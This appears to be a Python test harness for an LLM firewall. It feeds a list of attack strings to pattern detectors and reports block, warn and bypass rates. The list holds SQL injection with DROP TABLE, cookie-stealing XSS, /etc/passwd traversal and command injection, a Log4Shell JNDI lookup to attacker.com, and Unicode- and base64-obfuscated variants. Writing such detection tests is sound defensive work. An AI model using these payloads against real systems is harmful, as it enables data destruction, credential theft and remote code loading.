#!/usr/bin/env python3
"""ULTIMATE ATTACK MIT ATTACK PATTERN DETECTOR"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

import base64
from tests_firewall.test_ultra_break_v4_dos import run_detectors_timed
from llm_firewall.detectors.attack_patterns import scan_attack_patterns
from llm_firewall.policy.risk_weights_v2_otb import decide_action_otb
from llm_firewall.preprocess.context import classify_context

attacks = [
    ("sql", "' OR '1'='1'; DROP TABLE users--"),
    ("sql", "admin'--"),
    ("xss", "<script>alert('XSS')</script>"),
    ("xss", "javascript:alert(document.cookie)"),
    ("path", "../../../etc/passwd"),
    ("cmd", "; cat /etc/passwd"),
    ("rce", "${jndi:ldap://attacker.com/exploit}"),
    ("unicode", "\u202e<script>alert('xss')</script>"),
    ("unicode", "admin\u200b'--"),
    ("encoding", base64.b64encode(b"<script>alert('xss')</script>").decode()),
    ("encoding", base64.b64encode(base64.b64encode(b"DROP TABLE users")).decode()),
    ("homoglyph", "\u0430dmin'--"),
    ("combining", "admin\u0301'--"),
    ("zw", "admin\u200b\u200c'--"),
    ("bidi", "\u202aalert('xss')"),
]

print("="*70)
print("ULTIMATE ATTACK MIT ATTACK PATTERN FIX")
print("="*70)

blocked = 0
warned = 0
passed = 0

for i, (category, payload) in enumerate(attacks):
    # Base detectors
    base_hits, elapsed = run_detectors_timed(payload)
    
    # ADD Attack Pattern Detection
    attack_hits = scan_attack_patterns(payload)
    
    # Combine
    all_hits = list(base_hits) + attack_hits
    
    ctx = classify_context(payload)
    action, risk, contrib = decide_action_otb(all_hits, ctx, text=payload)
    
    if action == 'BLOCK':
        blocked += 1
    elif action == 'WARN':
        warned += 1
    else:
        passed += 1
        print(f"BYPASS {i+1}: {category} - {payload[:40]}... risk={risk:.2f}")

total = len(attacks)
print("\n" + "="*70)
print("ERGEBNISSE MIT FIX:")
print("="*70)
print(f"Total:   {total}")
print(f"BLOCKED: {blocked} ({blocked/total*100:.1f}%)")
print(f"WARNED:  {warned} ({warned/total*100:.1f}%)")
print(f"PASSED:  {passed} ({passed/total*100:.1f}%)")
print(f"\nASR (Attack Success Rate): {passed/total*100:.1f}%")
print(f"Block Rate: {blocked/total*100:.1f}%")
print(f"Detect Rate (WARN+BLOCK): {(blocked+warned)/total*100:.1f}%")

